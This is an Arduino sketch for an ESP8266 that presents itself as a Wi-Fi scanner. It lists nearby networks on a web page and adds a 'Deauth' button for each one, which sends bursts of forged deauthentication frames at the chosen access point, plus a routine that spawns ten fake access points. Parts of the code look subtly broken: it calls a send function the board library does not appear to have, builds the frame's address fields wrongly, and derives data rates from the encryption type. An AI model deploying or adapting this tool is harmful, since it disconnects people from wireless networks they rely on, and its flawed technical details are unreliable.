#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

const char* ssid = "ESP8266_WiFi_Scanner";
const char* password = "password123";

ESP8266WebServer server(80);

// HTML page start with a table and buttons
const char* htmlPageStart = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>ESP8266 WiFi Scanner</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      padding: 20px;
      max-width: 900px;
      margin: auto;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 20px;
    }
    th, td {
      border: 1px solid #ddd;
      padding: 12px;
      text-align: left;
    }
    th {
      background-color: #4CAF50;
      color: white;
    }
    button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 10px 20px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 14px;
      margin: 4px 2px;
      cursor: pointer;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <h1>Available WiFi Networks</h1>
  <table>
    <thead>
      <tr>
        <th>SSID</th>
        <th>BSSID</th>
        <th>RSSI (dBm)</th>
        <th>Encryption</th>
        <th>Channel</th>
        <th>Frequency (MHz)</th>
        <th>Hidden</th>
        <th>Max Data Rate (Mbps)</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>
)rawliteral";

// HTML page end with a "Create APs" button
const char* htmlPageEnd = R"rawliteral(
    </tbody>
  </table>
  <button onclick="location.href='/createAPs'">Create APs</button>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println("Setting up Access Point...");

  // Set Wi-Fi mode to both AP and STA for scanning and creating APs
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, password);

  // Start the web server and register routes
  server.on("/", handleRoot);
  server.on("/deauth", handleDeauth);
  server.on("/createAPs", handleCreateAPs);
  server.begin();
  
  Serial.println("Web server started.");
  Serial.println("Connect to the AP and navigate to http://192.168.4.1");
}

void loop() {
  // Handle incoming client requests
  server.handleClient();
}

// Handles the root request and displays available networks
void handleRoot() {
  String page = htmlPageStart;

  int n = WiFi.scanNetworks(false, true, false, 30000); // Passive scan
  if (n == 0) {
    page += "<tr><td colspan='9'>No networks found</td></tr>";
  } else {
    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      String bssid = formatBSSID(WiFi.BSSID(i));
      int rssi = WiFi.RSSI(i);
      String encryption = encryptionType(WiFi.encryptionType(i));
      int channel = WiFi.channel(i);
      uint32_t frequency = WiFi.frequency(i);
      bool hidden = WiFi.isHidden(i);
      float maxRate = WiFi.encryptionType(i) != ENC_TYPE_NONE ? getMaxRate(WiFi.encryptionType(i)) : 54.0;

      page += "<tr>";
      page += "<td data-label='SSID'>" + (ssid.length() > 0 ? ssid : "<i>Hidden</i>") + "</td>";
      page += "<td data-label='BSSID'>" + bssid + "</td>";
      page += "<td data-label='RSSI (dBm)'>" + String(rssi) + "</td>";
      page += "<td data-label='Encryption'>" + encryption + "</td>";
      page += "<td data-label='Channel'>" + String(channel) + "</td>";
      page += "<td data-label='Frequency (MHz)'>" + String(frequency) + "</td>";
      page += "<td data-label='Hidden'>" + String(hidden ? "Yes" : "No") + "</td>";
      page += "<td data-label='Max Data Rate (Mbps)'>" + String(maxRate) + "</td>";
      page += "<td><button onclick='location.href=\"/deauth?bssid=" + bssid + "\"'>Deauth</button></td>";
      page += "</tr>";
    }
  }

  page += htmlPageEnd;
  server.send(200, "text/html", page);
}

// Handles creating multiple fake APs
void handleCreateAPs() {
  int numAPs = 10; // Number of fake APs to create
  for (int i = 0; i < numAPs; i++) {
    String apSsid = "ESP8266_AP_" + String(i);
    String apPassword = "password" + String(i);
    WiFi.softAP(apSsid.c_str(), apPassword.c_str());
    delay(1000); // 1 second delay before creating the next AP
  }
  server.send(200, "text/plain", "Multiple access points created successfully.");
}

// Handles deauthentication requests
void handleDeauth() {
  String bssid = server.arg("bssid");
  Serial.println("Deauthing " + bssid);

  uint8_t packet[128];
  memset(packet, 0, 128);
  packet[0] = 0xC0; // Type: Deauthentication
  packet[1] = 0x00; // Subtype: Deauthentication

  // Convert BSSID to bytes
  uint8_t bssidBytes[6];
  for (int i = 0; i < 6; i++) {
    bssidBytes[i] = (uint8_t)strtol(bssid.substring(i * 3, (i * 3) + 2).c_str(), NULL, 16);
  }

  // Set BSSID, transmitter, and receiver addresses in the packet
  for (int i = 0; i < 6; i++) {
    packet[16 + i] = bssidBytes[i];
    packet[22 + i] = bssidBytes[i];
    packet[28 + i] = bssidBytes[i];
  }

  WiFi.mode(WIFI_STA);
  WiFi.begin(ssid, password);

  // Wait until connected to Wi-Fi
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");

  // Send deauthentication packets
  for (int i = 0; i < 50; i++) {
    WiFi.send(packet, 128, 0);
    delay(100); // Send every 100ms
  }

  server.send(200, "text/plain", "Deauthentication packets sent.");
}

// Helper function to get encryption type as a string
String encryptionType(uint8_t encryption) {
  switch(encryption) {
    case ENC_TYPE_WEP:
      return "WEP";
    case ENC_TYPE_TKIP:
      return "WPA";
    case ENC_TYPE_CCMP:
      return "WPA2";
    case ENC_TYPE_NONE:
      return "Open";
    case ENC_TYPE_AUTO:
      return "WPA/WPA2";
    case 8: // WPA3
      return "WPA3";
    default:
      return "Unknown";
  }
}

// Helper function to format BSSID as a string
String formatBSSID(const uint8_t* bssid) {
  String formatted = "";
  for (int i = 0; i < 6; i++) {
    if(bssid[i] < 16) formatted += "0";
    formatted += String(bssid[i], HEX);
    if(i < 5) formatted += ":";
  }
  return formatted.toUpperCase();
}

// Helper function to get max data rate based on encryption type
float getMaxRate(uint8_t encryption) {
  switch(encryption) {
    case ENC_TYPE_NONE:
      return 54.0; // 802.11g
    case ENC_TYPE_WEP:
      return 54.0;
    case ENC_TYPE_TKIP:
      return 130.0; // 802.11n
    case ENC_TYPE_CCMP:
      return 600.0; // 802.11n/ac
    case 8: // WPA3
      return 1000.0; // Assuming WPA3 max rate
    default:
      return 54.0;
  }
}
